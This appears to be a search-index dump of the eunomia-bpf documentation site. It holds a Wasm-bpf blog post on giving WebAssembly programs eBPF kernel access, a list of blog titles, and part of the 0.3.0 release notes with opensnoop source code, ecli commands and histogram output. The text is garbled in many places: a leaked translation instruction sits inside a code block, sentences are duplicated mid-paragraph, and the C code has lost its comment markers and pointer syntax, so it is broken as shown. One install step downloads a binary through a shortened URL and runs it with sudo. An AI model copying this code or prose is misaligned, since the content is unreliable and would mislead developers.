</li> <li>Reddit: AssemblyScript drops WASI (WASI vs Web incompatibilities debate) (27) (27: AssemblyScript has removed WASI support : r/programming)  </li> <li>GitHub Issue: WASI too inefficient on Web (Emscripten team feedback) (21: May WASI turn out to harm Wasm use cases on the Web? \u00b7 Issue #401 \u00b7 WebAssembly/WASI \u00b7 GitHub)  </li> <li>GitHub Issue: Wasmtime IO Performance (10x slower than native due to tokio) (12) (12: Poor performance of wasmtime file I/O maybe because tokio  \u00b7 Issue #7973 \u00b7 bytecodealliance/wasmtime \u00b7 GitHub)  </li> <li>Reddit: Node WASI not secure (Node\u2019s implementation lacks sandbox guarantees) (13: Since Node.js' node:wasi is hopelessly broken in mysterious ways, here's to calling wasmtime from Node.js, Deno, and Bun : r/javascript)  </li> <li>Fermyon Blog: Risks of WebAssembly (risks of slow standards and fragmentation) (8: Announcing WASIX - the Superset of WASI : r/rust) (22: The Risks of WebAssembly)  </li> <li>Fastly Blog: WASI 0.2 launch (overview of component model and new capabilities) (3) (3: WASI 0.2: Unlocking WebAssembly\u2019s Promise Outside the Browser | Fastly)  </li> <li>wasmCloud Blog: Wasm adoption barriers (survey citing inconsistencies between runtimes) (17: wasmCloud spurs Wasm adoption with major DevEx improvements | wasmCloud).</li> </ul> <p>Share on  Share on </p>"},{"location":"blog/2023/02/11/wasm-bpf-a-common-ebpf-kernel-programmability-for-cloud-native-webassembly/","title":"Wasm-bpf: A Common eBPF Kernel Programmability for Cloud-Native Webassembly","text":"<p>Author: Yusheng Zheng, Mao-Lin Chen</p> <p>Originally developed with a browser-safe sandbox in mind, Wasm has evolved to make WebAssembly a high-performance, cross-platform and multilingual software sandbox environment for cloud-native software components, and Wasm lightweight containers are well suited as the next-generation serverless platform runtime. Another exciting trend is the rise of eBPF, which enables cloud-native developers to build secure networks, service grids, and multiple observable components, and which is also gradually penetrating and penetrating deeper into kernel components, providing more powerful kernel-state programmable interactions.</p> <p>Wasm-bpf is a new open source project [1] that defines a set of abstractions for eBPF-related system interfaces and provides a corresponding set of development toolchains, libraries, and generic Wasm + eBPF runtime platform instances, giving applications in any Wasm virtual machine or Wasm lightweight container the ability to sink and extend usage scenarios to the kernel state, accessing almost all data in the kernel state and The eBPF runtime platform instance allows applications in any Wasm virtual machine or Wasm lightweight container to sink and expand their usage scenarios to the kernel state, access almost all data in the kernel state and user state, and achieve programmable control over the entire operating system in many aspects such as networking and security, thus greatly expanding the WebAssembly ecosystem in non-browser application scenarios.</p>"},{"location":"blog/2023/02/11/wasm-bpf-a-common-ebpf-kernel-programmability-for-cloud-native-webassembly/#ebpf-based-system-interface-for-wasm","title":"eBPF-based System Interface for Wasm","text":"<p>Perhaps you have also read this quote from Solomon Hykes (one of the founders of Docker).</p> <ul> <li>Wasm-bpf: A Common eBPF Kernel Programmability for Cloud-Native Webassembly</li> <li>eBPF-based System Interface for Wasm</li> <li>eBPF: Extending the Kernel Securely and Efficiently<ul> <li>The Future of eBPF: A JavaScript-Like Programmable Interface for the Kernel</li> </ul> </li> <li>Interaction flow between user space and eBPF programs<ul> <li>Common user-state eBPF development framework</li> <li>A new eBPF development framework defined on top of the user-state Wasm-eBPF system interface</li> </ul> </li> <li>References</li> </ul>"},{"location":"blog/2023/02/11/wasm-bpf-a-common-ebpf-kernel-programmability-for-cloud-native-webassembly/#ebpf-extending-the-kernel-securely-and-efficiently","title":"eBPF: Extending the Kernel Securely and Efficiently","text":"<p>eBPF is a revolutionary technology, originating from the Linux kernel, that allows sandboxed programs to be run in the kernel of the operating system. It is used to safely and efficiently extend the functionality of the kernel without changing the kernel's source code or loading kernel modules.</p> <p>Looking historically, the operating system kernel has been an ideal place to implement various capabilities like observability, security, and networking due to its privileged ability to supervise and control the entire system. However, due to the high demands on stability and security, kernel feature iterations are typically very cautious, and it is difficult to accept customized, less common functionality improvements. Therefore, compared to the functionalities in user space, the rate of innovation at the kernel-level operating system layer has always been relatively low.[2]</p> <p>eBPF fundamentally changes this paradigm. By allowing sandboxed programs to run within the operating system, application developers can programmatically add additional functionalities to the operating system at runtime. The operating system then ensures safety and execution efficiency, as if it were compiled locally with the help of a Just-In-Time (JIT) compiler and a verification engine. eBPF programs are portable across kernel versions and can be automatically updated, thus avoiding workload interruptions and node restarts.</p> <p>Today, eBPF is widely used in various scenarios: in modern data centers and cloud-native environments, it provides high-performance network packet processing and load balancing; with very low resource overhead, it achieves observability of a variety of fine-grained metrics, helping application developers track applications and provide insights for troubleshooting performance issues; it ensures the secure execution of applications and containers, and more. The possibilities are endless, and the innovation unleashed by eBPF in the operating system kernel is just beginning.[3]</p>"},{"location":"blog/2023/02/11/wasm-bpf-a-common-ebpf-kernel-programmability-for-cloud-native-webassembly/#the-future-of-ebpf-a-javascript-like-programmable-interface-for-the-kernel","title":"The Future of eBPF: A JavaScript-Like Programmable Interface for the Kernel","text":"<p>For browsers, the introduction of JavaScript's programmability sparked a significant revolution, turning browsers into almost independent operating systems. Now, looking at eBPF: to understand the impact of eBPF on the programmability of the Linux kernel, it is helpful to have a high-level understanding of the structure of the Linux kernel and how it interacts with applications and hardware.[4]</p> <p>The main purpose of the Linux kernel is to abstract the hardware or virtual hardware and provide a consistent API (system calls) to allow applications to run and share resources. To achieve this, a series of subsystems and layers are maintained to distribute these responsibilities. Each subsystem typically allows some degree of configuration to take into account the different needs of the user. If the desired behavior cannot be configured, changing the kernel is necessary. Historically, changing the kernel's behavior or enabling user-written programs to run in the kernel has presented two options.</p> Support a kernel module locally Write a kernel module Change the kernel source code and convince the Linux kernel community that such a change is necessary. Wait a few years for a new kernel version to become a commodity. Fix it regularly, as every kernel version can break it. Risk breaking your Linux kernel due to the lack of security boundaries <p>In practice, neither option is commonly used; the former is too costly, and the latter has almost no portability.</p> <p>With eBPF, there is a new option to reprogram the behavior of the Linux kernel without changing the kernel's source code or loading kernel modules, while guaranteeing a certain degree of consistency and compatibility of behavior, as well as security, between different kernel versions. To achieve this, eBPF programs also need to have a corresponding set of APIs that allow user-defined applications to run and share resources -- in other words, in a sense, the eBPF virtual machine also provides a set of system call-like mechanisms that are available to Wasm virtual machines and user-state applications through the eBPF and user-state communication mechanisms. With the eBPF and user state communication mechanisms, Wasm VMs and user state applications can also gain full access to this set of \"system calls\", which can programmatically extend the capabilities of traditional system calls on the one hand, and achieve more efficient programmable IO processing on the other.</p> <p></p> <p>As the diagram above shows, today's Linux kernel is evolving into a new kernel model: user-defined applications can execute in both the kernel and user states, with the user state accessing system resources through traditional system calls and the kernel state interacting with various parts of the system through BPF Helper Calls. As of early 2023, there are more than 220 Helper System Interfaces in the eBPF virtual machine in the kernel, covering a very wide range of application scenarios.</p> <p>It is important to note that BPF Helper Calls and System Calls are not in competition with each other; they have completely different programming models and scenarios where they have performance benefits, and they do not completely replace each other. The situation is similar for the Wasm and Wasi related ecosystems, where a specially designed wasi interface requires a lengthy standardization process but may yield better performance and portability guarantees for user-state applications in specific scenarios, while eBPF provides a fast and flexible solution for extending the system interface while maintaining the sandbox nature and portability.</p> <p>The eBPF is still in its early stages, but with the ability to interact between the kernel and user state provided by the current eBPF, applications in the Wasm VM can already obtain data and return values (kprobe, uprobe, ...) from almost any function call in the kernel and user state via the Wasm-bpf system interface transformation. ; collect and understand all system calls and obtain packet and socket level data for all network operations at a very low cost (tracepoint, socket...) Add additional protocol analyzers to the network packet processing solution and easily program any forwarding logic (XDP, TC...) ) to meet changing needs without leaving the packet processing environment of the Linux kernel.</p> <p>Moreover, eBPF has the ability to write data to any address of any process in user space (bpf_probe_write_user[5]), to modify the return value of kernel functions to a limited extent (bpf_override_return[6]), and even to execute some system calls directly in the kernel state [7]; fortunately, eBPF performs a bytecode analysis before loading into the Fortunately, eBPF performs strict security checks on the bytecode before loading it into the kernel to ensure that there are no memory out-of-bounds or other operations, while many features that may expand the attack surface and pose security risks need to be explicitly chosen to be enabled at compile time before the kernel can be used; certain eBPF features can also be explicitly chosen to be enabled or disabled before the Wasm VM loads the bytecode into the kernel to ensure the security of the sandbox.</p> <p>All of these scenarios do not require leaving the Wasm lightweight container: unlike traditional applications that use Wasm as a data processing or control plug-in, where these steps are implemented by logic outside the Wasm VM, it is now possible to achieve complete control and interaction with eBPF and almost all system resources that eBPF can access, even generating eBPF in real time, from within the Wasm lightweight container code to change the behavior logic of the kernel, enabling programmability of the entire system from the user state to the kernel state.</p>"},{"location":"blog/2023/02/11/wasm-bpf-a-common-ebpf-kernel-programmability-for-cloud-native-webassembly/#interaction-flow-between-user-space-and-ebpf-programs","title":"Interaction flow between user space and eBPF programs","text":"<p>eBPF programs are function-based and event-driven, and a specific eBPF program is run when a kernel or user space application passes a hook point. To use an eBPF program, we first need to compile the corresponding source code into bpf bytecode using the clang/LLVM toolchain, which contains the corresponding data structure definitions, maps and progs definitions. progs are program segments, and maps can be used to store data or for bidirectional communication with the user space. After that, we can implement a complete eBPF application with the help of the user state development framework and the loading framework.</p>"},{"location":"blog/2023/02/11/wasm-bpf-a-common-ebpf-kernel-programmability-for-cloud-native-webassembly/#common-user-state-ebpf-development-framework","title":"Common user-state eBPF development framework","text":"<p>For a complete eBPF application, there are usually two parts: the user state and the kernel state.</p> <ul> <li>The user state program needs to interact with the kernel through a series of system calls (mainly bpf system calls), create a corresponding map to store data in the kernel state or to communicate with the user state, dynamically select different segments to load according to the configuration, dynamically modify the bytecode or configure the parameters of the eBPF program, load the corresponding bytecode information into the kernel, ensure security through validators, and communicate with the kernel through maps and the kernel, passing data from the kernel state to the user state (or vice versa) through mechanisms such as ring buffer / perf buffer.</li> <li>The kernel state is mainly responsible for the specific computational logic and data collection.</li> </ul>"},{"location":"blog/2023/02/11/wasm-bpf-a-common-ebpf-kernel-programmability-for-cloud-native-webassembly/#a-new-ebpf-development-framework-defined-on-top-of-the-user-state-wasm-ebpf-system-interface","title":"A new eBPF development framework defined on top of the user-state Wasm-eBPF system interface","text":"<p>The project essentially wants to treat the Wasm sandbox as an alternative user-state runtime space on top of the OS, allowing Wasm applications to implement the same programming model and execution logic in the sandbox as eBPF applications that normally run in the user state.</p> <p>Wasm-bpf would require a runtime module built on top of the host (outside the sandbox), and some runtime libraries compiled to Wasm bytecode inside the sandbox to provide complete support.</p> <p></p> <p>To achieve a complete development model, we need.</p> <ul> <li>a Wasm module can correspond to multiple eBPF procedures.</li> <li>an instance of an eBPF procedure can also be shared by multiple Wasm modules</li> <li>The ability to dynamically load eBPF programs from the Wasm sandbox into the kernel, select the desired mount points to mount them, unmount them, control the complete lifecycle of multiple eBPF bytecode objects, and support most eBPF program types.</li> <li>Bi-directional communication with the kernel via multiple types of Maps, with support for most types of Maps.</li> <li>Efficient sending of messages from the kernel state to the user state (and vice versa for ring buffering) via ring buffering and perf event polling.</li> <li>It can be adapted to almost any application scenario that uses eBPF programs, and can evolve and extend as kernel features are added, without requiring changes to the Wasm VM's system interface.</li> </ul> <p>This is what the Wasm-bpf project is currently working on. We have also proposed a new Proposal for WASI: WASI-eBPF [7].</p> <p>In the Wasm-bpf project, all communications between Wasm and eBPF VMs do not need to go through serialization and deserialization mechanisms, and with the support of code generation techniques and BTF (BPF type format [12]) information in the toolchain, we can achieve correct communication between eBPF and Wasm with potentially different structure in vivo layouts, different size end mechanisms, different pointer widths The data can be copied directly from the kernel state to the memory of the Wasm VM when communicating through eBPF Maps, avoiding the extra loss caused by multiple copies. At the same time, the eBPF-Wasm development experience for user-state programs is greatly improved by automatically generating skeleton (bpf code framework) and type definitions.</p> <p>Thanks to the CO-RE (Compile-Once, Run Everywhere) technology provided by libbpf, porting eBPF bytecode objects between different kernel versions does not introduce an additional recompilation process, nor is there any LLVM/Clang dependency at runtime [12].</p> <p>Typically a compiled eBPF-Wasm module is only about 90Kb and can be dynamically loaded into the kernel and executed in less than 100ms. We also provide several examples in our repository, corresponding to various scenarios such as observable, network, and security.</p> <p>We would like to thank Associate Professor Xiaozheng Lai from South China University of Technology, Professor Lijun Chen's team from Xi'an University of Posts and Telecommunications, and teachers Pu Wang and Jicheng Shi from Datan Technology for their guidance and help in combining Wasm and eBPF. blog, we will give a more detailed analysis of the principle and performance, as well as some code examples.</p> <p>The Wasm-bpf compilation toolchain and runtime modules are currently developed and maintained by the eunomia-bpf open source community, and we thank the PLCT Lab of the Institute of Software of the Chinese Academy of Sciences for their support and funding, and our fellow community members for their contributions. Next, we will also improve and explore more on the corresponding eBPF and Wasm related toolchain and runtime, and actively feed back and contribute to the upstream community.</p>"},{"location":"blog/2023/02/11/wasm-bpf-a-common-ebpf-kernel-programmability-for-cloud-native-webassembly/#references","title":"References","text":"<ul> <li>[1] wasm-bpf Github open source address: https://github.com/eunomia-bpf/wasm-bpf</li> <li>[2] When Wasm meets eBPF: Writing, distributing, loading and running eBPF programs using WebAssembly: https://zhuanlan.zhihu.com/p/573941739</li> <li>[3] https://ebpf.io/</li> <li>[4] What is eBPF: https://ebpf.io/what-is-ebpf</li> <li>[5] Offensive BPF: Understanding and using bpf_probe_write_user https://embracethered.com/blog/posts/2021/offensive-bpf-libbpf-bpf</li> <li>[6] Cloud Native Security Attack and Defense\uff5cAnalysis and practice of escape container technology using eBPF: https://security.tencent.com/index.php/blog/msg/206</li> <li>[7] kernel-versions.md: https://github.com/iovisor/bcc/blob/master/docs/kernel-versions.md</li> <li>[8] WebAssembly: Docker without containers: https://zhuanlan.zhihu.com/p/595257541</li> <li>[9] Introduction to WebAssembly, a tool for scalability in cloud-native projects https://mp.weixin.qq.com/s/fap0bl6GFGi8zN5BFLpkCw</li> <li>[10] WASI-eBPF: https://github.com/WebAssembly/WASI/issues/513</li> <li>[11] BPF BTF Explained: https://www.ebpf.top/post/kernel_btf/</li> <li>[12] BPF portability and CO-RE (compile once, run everywhere): https://cloud.tencent.com/developer/article/1802154</li> </ul> <p>Share on  Share on </p>"},{"location":"blogs/","title":"Blogs about eunomia-bpf community","text":"<ul> <li>Modernizing eBPF for the Next Decade: Past, Present, and Future</li> <li>Simplifying Kernel Programming: The LLM-Powered eBPF Tool</li> <li>Expanding eBPF Compile Once, Run Everywhere(CO-RE) to Userspace Compatibility</li> <li>Implementing an Inline Hook in C in 5 minutes</li> <li>bpftime: Extending eBPF from Kernel to User Space</li> <li>The Secure Path Forward for eBPF: Challenges and Innovations</li> <li>Userspace eBPF Runtimes: Overview and Applications</li> <li>Wasm-bpf: Bridging Webassembly and eBPF Kernel Programmability</li> <li>Writing eBPF Programs in C/C++ and libbpf within WebAssembly</li> <li>Writing eBPF Programs in Rust within WebAssembly and Publishing OCI Images</li> <li>Using ChatGPT to Write eBPF Programs and Trace Linux Systems through Natural Language</li> <li>When Wasm Meets eBPF: Writing, Distributing, Loading, and Running eBPF Programs with WebAssembly</li> <li>How to Embark on the eBPF Journey in the Linux Microscope (LMP) Project</li> <li>eunomia-bpf 0.3.0 Release: Write Kernel Mode Code Only and Easily Build, Package, and Publish Complete eBPF Applications</li> <li>eunomia-bpf: Looking Forward to 2023, Letting eBPF Fly with Wasm Wings</li> </ul> <p>Share on  Share on </p>"},{"location":"blogs/0_3_0-release/","title":"eunomia-bpf 0.3.0 Release: Easily Build, Package, and Publish Full eBPF Applications by Writing Kernel-Mode Code","text":""},{"location":"blogs/0_3_0-release/#introduction-to-eunomia-bpf","title":"Introduction to eunomia-bpf","text":"<p>eBPF, derived from BPF, is an efficient and flexible virtual machine component within the kernel. It executes bytecode at various kernel hook points in a secure manner, enabling developers to build performance analysis tools, software-defined networks, security solutions, and more. However, there are some inconveniences when it comes to developing and using eBPF applications:</p> <ul> <li>Setting up and developing eBPF programs is a complex task. It requires handling interactions and information processing between kernel mode and user mode, as well as configuring the environment and writing corresponding build scripts.</li> <li>Currently, it is difficult to achieve compatibility and unified management among tools written in different user mode languages like C, Go, Rust, etc. There is a challenge in integrating various development ecosystems, such as supporting multiple architectures, languages, and kernel versions. How can we package, distribute, and publish binary eBPF programs in a standardized and convenient way? Additionally, there is a need to easily adjust mounting points, parameters, and other aspects of eBPF programs.</li> <li>How can we make it easier to use eBPF tools? Is it possible to download and use them with just one command from the cloud, similar to Docker? Can we run eBPF programs as services, allowing hot updates and dynamic insertion/removal through HTTP requests and URLs?</li> </ul> <p>eunomia-bpf is an open-source eBPF dynamic loading runtime and development toolchain designed to simplify the development, building, distribution, and execution of eBPF programs. It is based on the CO-RE lightweight development framework of libbpf.</p> <p>With eunomia-bpf, you can:</p> <ul> <li>Write only kernel-mode code when developing eBPF programs or tools, and automatically obtain kernel-mode export information.</li> <li>Use Wasm for developing user-mode interactive programs. The Wasm virtual machine controls the loading, execution, and data processing of the entire eBPF program.</li> <li>eunomia-bpf can package pre-compiled eBPF programs into universal JSON or Wasm modules, enabling distribution across architectures and kernel versions without the need for recompilation, and facilitating dynamic loading and execution.</li> </ul> <p>eunomia-bpf consists of a compilation toolchain and a runtime library. Compared to traditional frameworks like BCC and native libbpf, eunomia-bpf greatly simplifies the development process of eBPF programs. In most cases, you only need to write kernel-mode code to easily build, package, and publish complete eBPF applications. The kernel-mode eBPF code ensures 100% compatibility with mainstream development frameworks like libbpf, libbpfgo, libbpf-rs, etc. When you need to write user-mode code, you can use WebAssembly (Wasm) to develop it in multiple languages. Compared to script tools like bpftrace, eunomia-bpf offers similar convenience and is not limited to tracing. It can be used in various scenarios like networking, security, and more.</p> <ul> <li>eunomia-bpf project on Github: https://github.com/eunomia-bpf/eunomia-bpf</li> <li>gitee mirror: https://gitee.com/anolis/eunomia</li> </ul> <p>We have released the latest version 0.3, which optimizes the overall development and usage process. It also supports more types of eBPF programs and maps.</p>"},{"location":"blogs/0_3_0-release/#runtime-optimization-enhanced-functionality-multiple-program-types","title":"Runtime Optimization: Enhanced Functionality, Multiple Program Types","text":"<ol> <li> <p>By writing only kernel-mode code, you can obtain corresponding output information and print it in a readable and well-organized manner to the standard output. Let's take the example of a simple eBPF program, opensnoop, which traces all open system calls:</p> <p>Header file opensnoop.h</p> <pre><code>#ifndef __OPENSNOOP_H\n#define __OPENSNOOP_H\n\n#define TASK_COMM_LEN 16\n#define NAME_MAX 255\n#define INVALID_UID ((uid_t)-1)\n\n// used for export event\nstruct event {\n  /* user terminology for pid: */\n  unsigned long long ts;\n  int pid;\n  int uid;\n  int ret;\n  int flags;\n  char comm[TASK_COMM_LEN];\n  char fname[NAME_MAX];\n};\n\n#endif /* __OPENSNOOP_H */\n</code></pre> <p>Kernel-mode code opensnoop.bpf.c</p> <p>```c</p>"},{"location":"blogs/0_3_0-release/#include","title":"include \". <p>format: Return only the translated content, not including the original text.```c</p>","text":""},{"location":"blogs/0_3_0-release/#include_1","title":"include","text":""},{"location":"blogs/0_3_0-release/#include-opensnooph","title":"include \"opensnoop.h\"   <p>struct args_t {   const char *fname;   int flags; };</p> <p>/// Process ID to trace const volatile int pid_target = 0; /// Thread ID to trace const volatile int tgid_target = 0; /// @description User ID to trace const volatile int uid_target = 0; /// @cmdarg {\"default\": false, \"short\": \"f\", \"long\": \"failed\"} const volatile bool targ_failed = false;</p> <p>struct {   __uint(type, BPF_MAP_TYPE_HASH);   __uint(max_entries, 10240);   __type(key, u32);   __type(value, struct args_t); } start SEC(\".maps\");</p> <p>struct {   __uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY);   __uint(key_size, sizeof(u32));   __uint(value_size, sizeof(u32)); } events SEC(\".maps\");</p> <p>static __always_inline bool valid_uid(uid_t uid) {   return uid != INVALID_UID; }</p> <p>static __always_inline bool trace_allowed(u32 tgid, u32 pid) {   u32 uid;</p> <p>/ filters /   if (tgid_target &amp;&amp; tgid_target != tgid)     return false;   if (pid_target &amp;&amp; pid_target != pid)     return false;   if (valid_uid(uid_target)) {     uid = (u32)bpf_get_current_uid_gid();     if (uid_target != uid) {       return false;     }   }   return true; }</p> <p>SEC(\"tracepoint/syscalls/sys_enter_open\") int tracepoint__syscalls__sys_enter_open(struct trace_event_raw_sys_enter ctx) {   u64 id = bpf_get_current_pid_tgid();   / use kernel terminology here for tgid/pid: */   u32 tgid = id &gt;&gt; 32;   u32 pid = id;</p> <p>/ store arg info for later lookup /   if (trace_allowed(tgid, pid)) {     struct args_t args = {};     args.fname = (const char *)ctx-&gt;args[0];     args.flags = (int)ctx-&gt;args[1];     bpf_map_update_elem(&amp;start, &amp;pid, &amp;args, 0);   }   return 0; }</p> <p>SEC(\"tracepoint/syscalls/sys_enter_openat\") int tracepoint__syscalls__sys_enter_openat(struct trace_event_raw_sys_enter* ctx) { <pre><code>u64 id = bpf_get_current_pid_tgid();\n/* use kernel terminology here for tgid/pid: */\nu32 tgid = id &gt;&gt; 32;\nu32 pid = id;\n\n/* store arg info for later lookup */\nif (trace_allowed(tgid, pid)) {\n  struct args_t args = {};\n  args.fname = (const char *)ctx-&gt;args[1];\n  args.flags = (int)ctx-&gt;args[2];\n  bpf_map_update_elem(&amp;start, &amp;pid, &amp;args, 0);\n}\nreturn 0;\n}\n\nstatic __always_inline\nint trace_exit(struct trace_event_raw_sys_exit* ctx)\n{\n  struct event event = {};\n  struct args_t *ap;\n  int ret;\n  u32 pid = bpf_get_current_pid_tgid();\n\n  ap = bpf_map_lookup_elem(&amp;start, &amp;pid);\n  if (!ap)\n    return 0; /* missed entry */\n  ret = ctx-&gt;ret;\n  if (targ_failed &amp;&amp; ret &gt;= 0)\n    goto cleanup; /* want failed only */\n\n  /* event data */\n  event.pid = bpf_get_current_pid_tgid() &gt;&gt; 32;\n  event.uid = bpf_get_current_uid_gid();\n  bpf_get_current_comm(&amp;event.comm, sizeof(event.comm));\n  bpf_probe_read_user_str(&amp;event.fname, sizeof(event.fname), ap-&gt;fname);\n  event.flags = ap-&gt;flags;\n  event.ret = ret;\n\n  /* emit event */\n  bpf_perf_event_output(ctx, &amp;events, BPF_F_CURRENT_CPU,\n            &amp;event, sizeof(event));\n\ncleanup:\n  bpf_map_delete_elem(&amp;start, &amp;pid);\n  return 0;\n}\n\nSEC(\"tracepoint/syscalls/sys_exit_open\")\nint tracepoint__syscalls__sys_exit_open(struct trace_event_raw_sys_exit* ctx)\n{\n  return trace_exit(ctx);\n}\n\nSEC(\"tracepoint/syscalls/sys_exit_openat\")\nint tracepoint__syscalls__sys_exit_openat(struct trace_event_raw_sys_exit* ctx)\n{\n  return trace_exit(ctx);\n}\n\n/// Trace open family syscalls.\nchar LICENSE[] SEC(\"license\") = \"GPL\";\n```\n\nCompile and run:\n\n```console\n$ ecc opensnoop.bpf.c opensnoop.h\nCompiling bpf object...\nGenerating export types...\nPacking ebpf object and config into package.json...\n$ sudo ecli examples/bpftools/opensnoop/package.json\".\n```\n\nCompilation and execution:**Markdown Translation:**\n\n```\nTIME     TS    PID   UID   RET   FLAGS   COMM        FNAME\n20:31:50  0    1     0     51    524288  systemd     /proc/614/cgroup\n20:31:50  0    33182 0     25    524288  ecli        /etc/localtime\n20:31:53  0    754   0     6     0       irqbalance  /proc/interrupts\n20:31:53  0    754   0     6     0       irqbalance  /proc/stat\n20:32:03  0    754   0     6     0       irqbalance  /proc/interrupts\n20:32:03  0    754   0     6     0       irqbalance  /proc/stat\n20:32:03  0    632   0     7     524288  vmtoolsd    /etc/mtab\n20:32:03  0    632   0     9     0       vmtoolsd    /proc/devices\n\n$ sudo ecli examples/bpftools/opensnoop/package.json --pid_target 754\nTIME     TS    PID   UID   RET   FLAGS  COMM        FNAME\n20:34:13  0    754   0     6     0      irqbalance  /proc/interrupts\n20:34:13  0    754   0     6     0      irqbalance  /proc/stat\n20:34:23  0    754   0     6     0      irqbalance  /proc/interrupts\n20:34:23  0    754   0     6     0      irqbalance  /proc/stat\n```\n\nOr compile using Docker:\n\n```shell\ndocker run -it -v `pwd`/:/src/ ghcr.io/eunomia-bpf/ecc-`uname -m`:latest\n```\n\nAfter compiling and publishing, you can easily start any eBPF program from the cloud with a single command, for example:\n\n```bash\nwget https://aka.pw/bpf-ecli -O ecli &amp;&amp; chmod +x ./ecli     # download the release from https://github.com/eunomia-bpf/eunomia-bpf/releases/latest/download/ecli\nsudo ./ecli https://eunomia-bpf.github.io/eunomia-bpf/sigsnoop/package.json # simply run a pre-compiled ebpf code from a url\nsudo ./ecli sigsnoop:latest # run with a name and download the latest version bpf tool from our repo\n```\n\nThe complete code is available here: [https://github.com/eunomia-bpf/eunomia-bpf/tree/master/examples/bpftools/opensnoop](https://github.com/eunomia-bpf/eunomia-bpf/tree/master/examples/bpftools/opensnoop)\n\n2. Support the automatic generation of user command-line parameters based on comments in the code.\n\nFor example, to implement a PID filter in an eBPF program, you only need to write kernel code and declare a global variable in eBPF to automatically generate command-line parameters:\n\n```c\n/// Process ID to trace\nconst volatile pid_t pid_target = 0;\n/// Thread ID to trace\".\n</code></pre> const volatile pid_t tgid_target = 0; /// @description User ID to trace const volatile uid_t uid_target = 0; /// @cmdarg {\"default\": false, \"short\": \"f\", \"long\": \"failed\"} /// @description target pid to trace const volatile bool targ_failed = false; <pre><code>We will extract the description information of the comments and put it in the configuration file, and convert it into command line arguments for the eBPF application. Take tracing all open system calls with opensnoop as an example:\n\n```console\n$ sudo ecli  examples/bpftools/opensnoop/package.json -h\nUsage: opensnoop_bpf [--help] [--version] [--verbose] [--pid_target VAR] [--tgid_target VAR] [--uid_target VAR] [--failed]\n\nTrace open family syscalls.\n\nOptional arguments:\n  -h, --help    shows help message and exits\n  -v, --version prints version information and exits\n  --verbose     prints libbpf debug information\n  --pid_target  Process ID to trace\n  --tgid_target Thread ID to trace\n\n$ sudo ecli examples/bpftools/opensnoop/package.json --pid_target 754\nTIME     TS      PID     UID     RET     FLAGS   COMM    FNAME\n20:34:13  0      754     0       6       0       irqbalance /proc/interrupts\n20:34:13  0      754     0       6       0       irqbalance /proc/stat\n20:34:23  0      754     0       6       0       irqbalance /proc/interrupts\n20:34:23  0      754     0       6       0       irqbalance /proc/stat\n</code></pre></p> <ol> <li>Support automatically collecting and synthesizing maps that are not ring buffer or perf event, such as hash map, and print out information or generate histograms.</li> </ol> <p>Previously, the use of ring buffer and perf event was slightly limited, so there needs to be a way to automatically collect data from maps by adding comments in the source code:</p> <pre><code>/// @sample {\"interval\": 1000, \"type\" : \"log2_hist\"}\nstruct {\n    __uint(type, BPF_MAP_TYPE_HASH);\n    __uint(max_entries, MAX_ENTRIES);\n    __type(key, u32);\n    __type(value, struct hist);\n} hists SEC(\".maps\");\n</code></pre> <p>It will collect the contents of counters every second (print_map), using runqlat as an example:</p> <pre><code>$ sudo ecli examples/bpftools/runqlat/package.json -h\nUsage: runqlat_bpf [--help] [--version] [--verbose] [--filter_cg] [--targ_per_process] [--targ_per_thread] [--targ_per_pidns] [--targ_ms] [--targ_tgid VAR]\n```Summarize run queue (scheduler) latency as a histogram.\n\n    Optional arguments:\n      -h, --help            shows help message and exits\n      -v, --version         prints version information and exits\n      --verbose             prints libbpf debug information\n      --filter_cg           set value of bool variable filter_cg\n      --targ_per_process    set value of bool variable targ_per_process\n      --targ_per_thread     set value of bool variable targ_per_thread\n      --targ_per_pidns      set value of bool variable targ_per_pidns\n      --targ_ms             set value of bool variable targ_ms\n      --targ_tgid           set value of pid_t variable targ_tgid\n\n    Built with eunomia-bpf framework.\n    See https://github.com/eunomia-bpf/eunomia-bpf for more information.\n\n    $ sudo ecli examples/bpftools/runqlat/package.json\n    key =  4294967295\n    comm = rcu_preempt\n\n        (unit)              : count    distribution\n            0 -&gt; 1          : 9        |****                                    |\n            2 -&gt; 3          : 6        |**                                      |\n            4 -&gt; 7          : 12       |*****                                   |\n            8 -&gt; 15         : 28       |*************                           |\n           16 -&gt; 31         : 40       |*******************                     |\n           32 -&gt; 63         : 83       |****************************************|\n           64 -&gt; 127        : 57       |***************************             |\n          128 -&gt; 255        : 19       |*********                               |\n          256 -&gt; 511        : 11       |*****                                   |\n          512 -&gt; 1023       : 2        |                                        |\n         1024 -&gt; 2047       : 2        |                                        |\n         2048 -&gt; 4095       : 0        |                                        |\n         4096 -&gt; 8191       : 0        |                                        |\n\n\n\nBuilt with eunomia-bpf framework.\nSee https://github.com/eunomia-bpf/eunomia-bpf for more information.8192 -&gt; 16383      : 0        |                                        |\n        16384 -&gt; 32767      : 1        |                                        |\n\n    $ sudo ecli examples/bpftools/runqlat/package.json --targ_per_process\n    key =  3189\n    comm = cpptools\n\n        (unit)              : count    distribution\n            0 -&gt; 1          : 0        |                                        |\n            2 -&gt; 3          : 0        |                                        |\n            4 -&gt; 7          : 0        |                                        |\n            8 -&gt; 15         : 1        |***                                     |\n           16 -&gt; 31         : 2        |*******                                 |\n           32 -&gt; 63         : 11       |****************************************|\n           64 -&gt; 127        : 8        |*****************************           |\n          128 -&gt; 255        : 3        |**********                              |\n    ```\n\n    Here is the complete code: &lt;https://github.com/eunomia-bpf/eunomia-bpf/tree/master/examples/bpftools/runqlat&gt;\n\n4. Add support for multiple types of maps like uprobe, tc, etc., allowing additional attach information to be added using annotations, for example:\n\n    ```c\n\n    /// @tchook {\"ifindex\":1, \"attach_point\":\"BPF_TC_INGRESS\"}\n    /// @tcopts {\"handle\":1,  \"priority\":1}\n    SEC(\"tc\")\n    int tc_ingress(struct __sk_buff *ctx)\n    {\n        void *data_end = (void *)(__u64)ctx-&gt;data_end;\n        void *data = (void *)(__u64)ctx-&gt;data;\n        struct ethhdr *l2;\n        struct iphdr *l3;\n\n        if (ctx-&gt;protocol != bpf_htons(ETH_P_IP))\n            return TC_ACT_OK;\n\n        l2 = data;\n        if ((void *)(l2 + 1) &gt; data_end)\n            return TC_ACT_OK;\n\n        l3 = (struct iphdr *)(l2 + 1);\n        if ((void *)(l3 + 1) &gt; data_end)\n            return TC_ACT_OK;\n\n        bpf_printk(\"Got IP packet: tot_len: %d, ttl: %d\", bpf_ntohs(l3-&gt;tot_len), l3-&gt;ttl);\n        return TC_ACT_OK;\n    }\n    ```\n\n## Regarding compilation: 